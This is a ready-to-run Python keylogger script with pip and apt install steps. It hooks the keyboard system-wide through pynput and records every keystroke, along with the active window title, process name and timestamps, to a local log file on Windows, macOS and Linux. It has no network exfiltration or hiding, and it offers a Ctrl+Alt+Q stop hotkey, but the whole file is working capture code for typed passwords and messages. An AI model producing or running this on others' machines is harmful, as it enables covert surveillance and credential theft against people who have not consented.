#!/usr/bin/env python3
"""Portable global keystroke + foreground-window logger.

Key capture: pynput, which installs a low-level system-wide hook.
Window titles: Win32 ctypes | macOS Quartz | Linux xdotool.

Stop with Ctrl+Alt+Q, SIGINT/SIGTERM, or by creating <log>.stop.

    pip install pynput psutil python-xlib    # python-xlib only needed on Linux
    apt-get install -y xdotool               # Linux only
    python keylogger.py --log keylog.txt
"""
import argparse
import ctypes
import os
import platform
import queue
import signal
import subprocess
import sys
import threading
import time
from datetime import datetime
from pathlib import Path

import psutil

SYSTEM = platform.system()

if SYSTEM == "Windows":
    import ctypes.wintypes as wintypes
    user32 = ctypes.WinDLL("user32", use_last_error=True)

try:
    from pynput import keyboard
except Exception as exc:
    sys.exit(f"pynput failed to start ({exc}). On Linux set DISPLAY / run under Xvfb.")

SPECIALS = {"space": " ", "enter": "\n", "tab": "\t", "backspace": "<BS>"}
FLUSH_INTERVAL = 1.0
POLL = 0.5


# ---------------------------------------------------------------- window info
def _foreground_windows():
    hwnd = user32.GetForegroundWindow()
    if not hwnd:
        return (0, "", "unknown", 0)
    length = user32.GetWindowTextLengthW(hwnd)
    buf = ctypes.create_unicode_buffer(length + 1)
    user32.GetWindowTextW(hwnd, buf, length + 1)
    pid = wintypes.DWORD()
    user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
    try:
        proc = psutil.Process(pid.value).name()
    except Exception:
        proc = "?"
    return (hwnd, buf.value, proc, pid.value)


def _xdo(*args):
    return subprocess.run(["xdotool", *args], capture_output=True, text=True, timeout=2)


def _foreground_linux():
    try:
        win = _xdo("getwindowfocus").stdout.strip()
        if not win or win == "0":
            return (0, "", "unknown", 0)
        title = _xdo("getwindowname", win).stdout.strip()
        pid = int(_xdo("getwindowpid", win).stdout.strip() or 0)
    except Exception:
        return (0, "", "unknown", 0)
    try:
        proc = psutil.Process(pid).name()
    except Exception:
        proc = "?"
    return (int(win), title, proc, pid)


def _foreground_macos():
    try:
        from Quartz import CGWindowListCopyWindowInfo, kCGWindowListOptionOnScreenOnly, kCGNullWindowID
        import AppKit
        info = CGWindowListCopyWindowInfo(kCGWindowListOptionOnScreenOnly, kCGNullWindowID)
        app = AppKit.NSWorkspace.sharedWorkspace().frontmostApplication()
        pid = app.processIdentifier()
        title = next((w.get("kCGWindowName", "") for w in info if w.get("kCGWindowOwnerPID") == pid), "")
        return (pid, title, app.localizedName(), pid)
    except Exception:
        return (0, "", "unknown", 0)


def foreground_info():
    if SYSTEM == "Windows":
        return _foreground_windows()
    if SYSTEM == "Darwin":
        return _foreground_macos()
    return _foreground_linux()


def format_key(key):
    try:
        ch = key.char
        if ch is not None:
            if len(ch) == 1 and ord(ch) < 32:
                return f"<Ctrl+{chr(ord(ch) + 96)}>"
            return ch
    except AttributeError:
        pass
    name = str(key).replace("Key.", "")
    return SPECIALS.get(name, f"<{name}>")


# -------------------------------------------------------------------- logger
class Keylogger:
    def __init__(self, log_path, echo=False):
        self.log_path = Path(log_path)
        self.stop_file = self.log_path.with_suffix(self.log_path.suffix + ".stop")
        self.echo = echo
        self.queue = queue.Queue()
        self._stop = threading.Event()
        self._lock = threading.Lock()
        self._last_win = None
        self._key_listener = None
        self._hotkey_listener = None

    def _emit(self, text):
        self.queue.put(text)

    def _note_window(self, info):
        with self._lock:
            if info == self._last_win:
                return
            self._last_win = info
            _, title, proc, pid = info
            stamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            self._emit(f"\n[{stamp}] === {proc} (pid {pid}) | {title or '<untitled>'} ===\n")

    def _writer_loop(self):
        last = time.monotonic()
        with self.log_path.open("a", encoding="utf-8") as fh:
            while True:
                chunk = self.queue.get()
                if chunk is None:
                    break
                fh.write(chunk)
                if self.echo:
                    sys.stdout.write(chunk)
                    sys.stdout.flush()
                if time.monotonic() - last >= FLUSH_INTERVAL:
                    fh.flush()
                    last = time.monotonic()
            fh.flush()

    def _window_loop(self):
        while not self._stop.is_set():
            try:
                if self.stop_file.exists():
                    self.stop_file.unlink(missing_ok=True)
                    self.stop()
                    return
                self._note_window(foreground_info())
            except Exception:
                pass
            self._stop.wait(POLL)

    def _on_press(self, key):
        if self._stop.is_set():
            return
        try:
            self._note_window(foreground_info())
            self._emit(format_key(key))
        except Exception:
            pass

    def stop(self):
        if self._stop.is_set():
            return
        self._stop.set()
        for listener in (self._key_listener, self._hotkey_listener):
            if listener is not None:
                try:
                    listener.stop()
                except Exception:
                    pass
        self._emit(f"\n--- session end {datetime.now():%Y-%m-%d %H:%M:%S} ---\n")
        self.queue.put(None)

    def run(self):
        self._emit(f"\n--- session start {datetime.now():%Y-%m-%d %H:%M:%S} ---\n")
        writer = threading.Thread(target=self._writer_loop, daemon=True)
        writer.start()
        threading.Thread(target=self._window_loop, daemon=True).start()

        self._key_listener = keyboard.Listener(on_press=self._on_press)
        self._key_listener.start()
        self._hotkey_listener = keyboard.GlobalHotKeys({"<ctrl>+<alt>+q": self.stop})
        self._hotkey_listener.start()

        self._stop.wait()
        writer.join(timeout=5)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--log", default="keylog.txt")
    ap.add_argument("--stdout", action="store_true", help="also echo to stdout")
    args = ap.parse_args()

    kl = Keylogger(args.log, echo=args.stdout)
    for sig in (signal.SIGINT, signal.SIGTERM):
        try:
            signal.signal(sig, lambda *_: kl.stop())
        except Exception:
            pass
    kl.run()


if __name__ == "__main__":
    main()